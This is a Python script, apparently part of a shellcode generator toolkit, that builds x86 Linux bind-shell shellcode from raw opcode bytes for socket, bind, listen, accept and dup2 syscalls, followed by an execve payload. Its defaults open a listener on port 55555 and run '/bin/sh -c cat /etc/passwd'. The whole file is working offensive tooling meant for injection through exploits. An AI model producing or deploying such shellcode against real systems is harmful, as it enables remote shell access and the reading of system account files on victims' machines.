import sys
from struct import pack
from build_sockaddr import *
from execve import *
from description import *
from out_format import *

##########################################################
#
#  1.  Bind port 127.0.0.1:BIND_PORT
#  2.  Run binfile  with paramters if given
#
#	                         random	     2014-04-21
##########################################################

BIND_IP = '127.0.0.1'
BIND_PORT = 55555
BIN_FILE = '/bin/sh'
PARAMETERS = ['-c','cat /etc/passwd']
UID = 0
LANGUAGE = 'c'
##########################################################
des_format = 'shellcode: bind port at 127.0.0.1:%s && execve(\'%s\',%s)' 
out_string = (str(BIND_PORT),BIN_FILE,PARAMETERS)

##########################################################
def bind_shellcode(bind_ip,bind_port,payload):

	if (not bind_port & 0xFF) or \
		(not bind_port>>8 & 0xFF) :
		print 'bind_port contains null bytes'
		exit(0) 

	shellcode = ''

	#sock()
	shellcode += '\x31\xc0\x31\xdb\x31\xc9\x31\xd2\x50\x6a\x01\x6a\x02\x89\xe1\xb3\x01\xb0\x66\xcd\x80\x89\xc6'	
	
	#bind()
	shellcode += build_sockaddr_shellcode(bind_ip, bind_port)
	shellcode += '\x89\xe1\x6a\x10\x51\x56\x89\xe1\xb3\x02\xb0\x66\xcd\x80'

	#listen()
	shellcode += '\xb2\x0a\x52\x56\x89\xe1\xb3\x04\xb0\x66\xcd\x80'
	
	#accept()
	shellcode += '\x83\xc4\x08\x83\xec\x04\x89\xe2\x83\xec\x10\x89\xe1\x52\x51\x56\x89\xe1\x31\xdb\xb3\x05\xb0\x66\xcd\x80'

	#call dup2(sockfd,0) dup2(sockfd,1) dup2(sockfd,2)
	shellcode += '\x89\xc3\x31\xc9\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80\x41\xb0\x3f\xcd\x80'
	
	#payload : execve(binpath,[binpath,arg1,arg2,...],NULL)
	shellcode += payload
	
	#call exit()
	#shellcode += '\x31\xc0\x31\xdb\x40\xcd\x80'
	
	return shellcode


def main():
	description(LANGUAGE,des_format,out_string)
	PAYLOAD = execve_shellcode(binpath=BIN_FILE, parameters=PARAMETERS)
	shellcode = bind_shellcode(bind_ip=BIND_IP, bind_port=BIND_PORT, payload = PAYLOAD)
	out_format(LANGUAGE,ouput=shellcode)

if __name__ == '__main__':	
	main()